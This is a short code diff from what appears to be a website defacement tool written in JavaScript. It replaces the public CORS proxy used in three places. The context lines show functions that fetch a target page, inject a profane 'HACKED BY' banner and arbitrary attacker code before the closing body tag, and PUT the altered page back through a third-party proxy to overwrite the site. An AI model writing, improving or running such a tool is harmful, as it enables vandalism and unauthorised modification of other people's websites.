@@ -34,7 +34,7 @@ window.onload = function () {
 
 // Function to fetch content with CORS bypass and error handling
 async function fetchWithCORS(url) {
-    const corsProxy = 'https://corsproxy.io/?'; // Using corsproxy.io
+  const corsProxy = 'https://api.codetabs.com/v1/proxy/?quest='; // Using codetabs.com proxy
     const proxiedUrl = corsProxy + encodeURIComponent(url);
 
     try {
@@ -96,7 +96,7 @@ async function performDefacement(targetURL, defacementCode) {
         const modifiedContent = originalContent.replace('</body>', `<div style="color: purple; background-color: darkred; font-size: 2em; text-align: center;">HACKED BY Noodles Inc. - YOU JUST GOT FUCKED!</div>${defacementCode}</body>`);
 
          // Use a proxy to bypass CORS for PUT requests
-         const corsProxy = 'https://corsproxy.io/?';
+         const corsProxy = 'https://api.codetabs.com/v1/proxy/?quest=';
          const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
 
          const response = await fetch(proxiedUrl, {
@@ -202,7 +202,7 @@ async function restoreWebsite(targetURL) {
         const backupContent = await backupResponse.text();
 
          // Use a proxy to bypass CORS for PUT requests
-         const corsProxy = 'https://corsproxy.io/?';
+         const corsProxy = 'https://api.codetabs.com/v1/proxy/?quest=';
          const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
 
          const response = await fetch(proxiedUrl, {
